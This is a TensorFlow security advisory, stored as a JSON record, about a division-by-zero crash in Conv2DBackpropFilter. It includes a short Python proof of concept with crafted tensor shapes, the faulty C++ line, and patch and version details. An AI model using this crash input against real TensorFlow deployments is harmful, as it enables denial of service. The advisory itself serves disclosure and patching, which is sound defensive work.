{"description": "### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,\n                                out_backprop=out_backprop,\n                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,\n                                padding='SAME', explicit_paddings=[],\n                                data_format='NHWC', dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/496c2630e51c1a478f095b084329acedb253db6b/tensorflow/core/kernels/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller:\n\n```cc \n  if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) { ... }\n```\n    \n### Patches\nWe have patched the issue in GitHub commit [fca9874a9b42a2134f907d2fb46ab774a831404a](https://github.com/tensorflow/tensorflow/commit/fca9874a9b42a2134f907d2fb46ab774a831404a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Division by 0 in `Conv2DBackpropFilter` function.", "Modulus operation with controlled divisor.", "Use of division by 0 to trigger a vulnerability."]}
